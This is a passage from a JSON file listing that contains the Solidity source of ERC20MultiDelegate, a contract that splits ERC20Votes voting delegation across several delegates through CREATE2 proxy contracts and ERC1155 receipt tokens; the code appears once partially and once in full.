sourcesLength > 0 || targetsLength > 0,\n            \"Delegate: You should provide at least one source or one target delegate\"\n        );\n\n        require(\n            Math.max(sourcesLength, targetsLength) == amountsLength,\n            \"Delegate: The number of amounts must be equal to the greater of the number of sources or targets\"\n        );\n\n        // Iterate until all source and target delegates have been processed.\n        for (\n            uint transferIndex = 0;\n            transferIndex < Math.max(sourcesLength, targetsLength);\n            transferIndex++\n        ) {\n            address source = transferIndex < sourcesLength\n                ? address(uint160(sources[transferIndex]))\n                : address(0);\n            address target = transferIndex < targetsLength\n                ? address(uint160(targets[transferIndex]))\n                : address(0);\n            uint256 amount = amounts[transferIndex];\n\n            if (transferIndex < Math.min(sourcesLength, targetsLength)) {\n                // Process the delegation transfer between the current source and target delegate pair.\n                _processDelegation(source, target, amount);\n            } else if (transferIndex < sourcesLength) {\n                // Handle any remaining source amounts after the transfer process.\n                _reimburse(source, amount);\n            } else if (transferIndex < targetsLength) {\n                // Handle any remaining target amounts after the transfer process.\n                createProxyDelegatorAndTransfer(target, amount);\n            }\n        }\n\n        if (sourcesLength > 0) {\n            _burnBatch(msg.sender, sources, amounts[:sourcesLength]);\n        }\n        if (targetsLength > 0) {\n            _mintBatch(msg.sender, targets, amounts[:targetsLength], \"\");\n        }\n    }\n\n    /**\n     * @dev Processes the delegation transfer between a source delegate and a target delegate.\n     * @param source The source delegate from which tokens are being withdrawn.\n     * @param target The target delegate to which tokens are being transferred.\n     * @param amount The amount of tokens transferred between the source and target delegates.\n     */\n    function _processDelegation(\n        address source,\n        address target,\n        uint256 amount\n    ) internal {\n        uint256 balance = getBalanceForDelegate(source);\n\n        assert(amount <= balance);\n\n        deployProxyDelegatorIfNeeded(target);\n        transferBetweenDelegators(source, target, amount);\n\n        emit DelegationProcessed(source, target, amount);\n    }\n\n    /**\n     * @dev Reimburses any remaining source amounts back to the delegator after the delegation transfer process.\n     * @param source The source delegate from which tokens are being withdrawn.\n     * @param amount The amount of tokens to be withdrawn from the source delegate.\n     */\n    function _reimburse(address source, uint256 amount) internal {\n        // Transfer the remaining source amount or the full source amount\n        // (if no remaining amount) to the delegator\n        address proxyAddressFrom = retrieveProxyContractAddress(token, source);\n        token.transferFrom(proxyAddressFrom, msg.sender, amount);\n    }\n\n    function setUri(string memory uri) external onlyOwner {\n        _setURI(uri);\n    }\n\n    function createProxyDelegatorAndTransfer(\n        address target,\n        uint256 amount\n    ) internal {\n        address proxyAddress = deployProxyDelegatorIfNeeded(target);\n        token.transferFrom(msg.sender, proxyAddress, amount);\n    }\n\n    function transferBetweenDelegators(\n        address from,\n        address to,\n        uint256 amount\n    ) internal {\n        address proxyAddressFrom = retrieveProxyContractAddress(token, from);\n        address proxyAddressTo = retrieveProxyContractAddress(token, to);\n        token.transferFrom(proxyAddressFrom, proxyAddressTo, amount);\n    }\n\n    function deployProxyDelegatorIfNeeded(\n        address delegate\n    ) internal returns (address) {\n        address proxyAddress = retrieveProxyContractAddress(token, delegate);\n\n        // check if the proxy contract has already been deployed\n        uint bytecodeSize;\n        assembly {\n            bytecodeSize := extcodesize(proxyAddress)\n        }\n\n        // if the proxy contract has not been deployed, deploy it\n        if (bytecodeSize == 0) {\n            new ERC20ProxyDelegator{salt: 0}(token, delegate);\n            emit ProxyDeployed(delegate, proxyAddress);\n        }\n        return proxyAddress;\n    }\n\n    function getBalanceForDelegate(\n        address delegate\n    ) internal view returns (uint256) {\n        return ERC1155(this).balanceOf(msg.sender, uint256(uint160(delegate)));\n    }\n\n    function retrieveProxyContractAddress(\n        ERC20Votes _token,\n        address _delegate\n    ) private view returns (address) {\n        bytes memory bytecode = abi.encodePacked(\n            type(ERC20ProxyDelegator).creationCode, \n            abi.encode(_token, _delegate)\n        );\n        bytes32 hash = keccak256(\n            abi.encodePacked(\n                bytes1(0xff),\n                address(this),\n                uint256(0), // salt\n                keccak256(bytecode)\n            )\n        );\n        return address(uint160(uint256(hash)));\n    }\n}"
    },
    {
      "filename": "contracts/ERC20MultiDelegate.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.2;\n\nimport {Address} from \"@openzeppelin/contracts/utils/Address.sol\";\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC1155/ERC1155.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Votes.sol\";\nimport \"@openzeppelin/contracts/utils/math/Math.sol\";\n\n/**\n * @dev A child contract which will be deployed by the ERC20MultiDelegate utility contract\n * This is a proxy delegator contract to vote given delegate on behalf of original delegator\n */\ncontract ERC20ProxyDelegator {\n    constructor(ERC20Votes _token, address _delegate) {\n        _token.approve(msg.sender, type(uint256).max);\n        _token.delegate(_delegate);\n    }\n}\n\n/**\n * @dev A utility contract to let delegators to pick multiple delegate\n */\ncontract ERC20MultiDelegate is ERC1155, Ownable {\n    using Address for address;\n\n    ERC20Votes public token;\n\n    /** ### EVENTS ### */\n\n    event ProxyDeployed(address indexed delegate, address proxyAddress);\n    event DelegationProcessed(\n        address indexed from,\n        address indexed to,\n        uint256 amount\n    );\n\n    /**\n     * @dev Constructor.\n     * @param _token The ERC20 token address\n     * @param _metadata_uri ERC1155 metadata uri\n     */\n    constructor(\n        ERC20Votes _token,\n        string memory _metadata_uri\n    ) ERC1155(_metadata_uri) {\n        token = _token;\n    }\n\n    /**\n     * @dev Executes the delegation transfer process for multiple source and target delegates.\n     * @param sources The list of source delegates.\n     * @param targets The list of target delegates.\n     * @param amounts The list of amounts to deposit/withdraw.\n     */\n    function delegateMulti(\n        uint256[] calldata sources,\n        uint256[] calldata targets,\n        uint256[] calldata amounts\n    ) external {\n        _delegateMulti(sources, targets, amounts);\n    }\n\n    function _delegateMulti(\n        uint256[] calldata sources,\n        uint256[] calldata targets,\n        uint256[] calldata amounts\n    ) internal {\n        uint256 sourcesLength = sources.length;\n        uint256 targetsLength = targets.length;\n        uint256 amountsLength = amounts.length;\n\n        require(\n            sourcesLength > 0 || targetsLength > 0,\n            \"Delegate: You should provide at least one source or one target delegate\"\n        );\n\n        require(\n            Math.max(sourcesLength, targetsLength) == amountsLength,\n            \"Delegate: The number of amounts must be equal to the greater of the number of sources or targets\"\n        );\n\n        // Iterate until all source and target delegates have been processed.\n        for (\n            uint transferIndex = 0;\n            transferIndex < Math.max(sourcesLength, targetsLength);\n            transferIndex++\n        ) {\n            address source = transferIndex < sourcesLength\n                ? address(uint160(sources[transferIndex]))\n                : address(0);\n            address target = transferIndex < targetsLength\n                ? address(uint160(targets[transferIndex]))\n                : address(0);\n            uint256 amount = amounts[transferIndex];\n\n            if (transferIndex < Math.min(sourcesLength, targetsLength)) {\n                // Process the delegation transfer between the current source and target delegate pair.\n                _processDelegation(source, target, amount);\n            } else if (transferIndex < sourcesLength) {\n                // Handle any remaining source amounts after the transfer process.\n                _reimburse(source, amount);\n            } else if (transferIndex < targetsLength) {\n                // Handle any remaining target amounts after the transfer process.\n                createProxyDelegatorAndTransfer(target, amount);\n            }\n        }\n\n        if (sourcesLength > 0) {\n            _burnBatch(msg.sender, sources, amounts[:sourcesLength]);\n        }\n        if (targetsLength > 0) {\n            _mintBatch(msg.sender, targets, amounts[:targetsLength], \"\");\n        }\n    }\n\n    /**\n     * @dev Processes the delegation transfer between a source delegate and a target delegate.\n     * @param source The source delegate from which tokens are being withdrawn.\n     * @param target The target delegate to which tokens are being transferred.\n     * @param amount The amount of tokens transferred between the source and target delegates.\n     */\n    function _processDelegation(\n        address source,\n        address target,\n        uint256 amount\n    ) internal {\n        uint256 balance = getBalanceForDelegate(source);\n\n        assert(amount <= balance);\n\n        deployProxyDelegatorIfNeeded(target);\n        transferBetweenDelegators(source, target, amount);\n\n        emit DelegationProcessed(source, target, amount);\n    }\n\n    /**\n     * @dev Reimburses any remaining source amounts back to the delegator after the delegation transfer process.\n     * @param source The source delegate from which tokens are being withdrawn.\n     * @param amount The amount of tokens to be withdrawn from the source delegate.\n     */\n    function _reimburse(address source, uint256 amount) internal {\n        // Transfer the remaining source amount or the full source amount\n        // (if no remaining amount) to the delegator\n        address proxyAddressFrom = retrieveProxyContractAddress(token, source);\n        token.transferFrom(proxyAddressFrom, msg.sender, amount);\n    }\n\n    function setUri(string memory uri) external onlyOwner {\n        _setURI(uri);\n    }\n\n    function createProxyDelegatorAndTransfer(\n        address target,\n        uint256 amount\n    ) internal {\n        address proxyAddress = deployProxyDelegatorIfNeeded(target);\n        token.transferFrom(msg.sender, proxyAddress, amount);\n    }\n\n    function transferBetweenDelegators(\n        address from,\n        address to,\n        uint256 amount\n    ) internal {\n        address proxyAddressFrom = retrieveProxyContractAddress(token, from);\n        address proxyAddressTo = retrieveProxyContractAddress(token, to);\n        token.transferFrom(proxyAddressFrom, proxyAddressTo, amount);\n    }\n\n    function deployProxyDelegatorIfNeeded(\n        address delegate\n    ) internal returns (address) {\n        address proxyAddress = retrieveProxyContractAddress(token, delegate);\n\n        // check if the proxy contract has already been deployed\n        uint bytecodeSize;\n        assembly {\n            bytecodeSize := extcodesize(proxyAddress)\n        }\n\n        // if the proxy contract has not been deployed, deploy it\n        if (bytecodeSize == 0) {\n            new ERC20ProxyDelegator{salt: 0}(token, delegate);\n            emit ProxyDeployed(delegate, proxyAddress);\n        }\n        return proxyAddress;\n    }\n\n    function getBalanceForDelegate(\n        address delegate\n    ) internal view returns (uint256) {\n        return ERC1155(this).balanceOf(msg.sender, uint256(uint160(delegate)));\n    }\n\n    function retrieveProxyContractAddress(\n        ERC20Votes _token,\n        address _delegate\n    ) private view returns (address) {\n        bytes memory bytecode = abi.encodePacked(\n            type(ERC20ProxyDelegator).creationCode, \n            abi.encode(_token, _delegate)\n        );\n        bytes32 hash = keccak256(\n            abi.encodePacked(\n                bytes1(0xff),\n                address(this),\n                uint256(0), // salt\n                keccak256(bytecode)\n            )\n        );\n        return address(uint160(uint256(hash)));\n    }\n}"
    }
  ]
}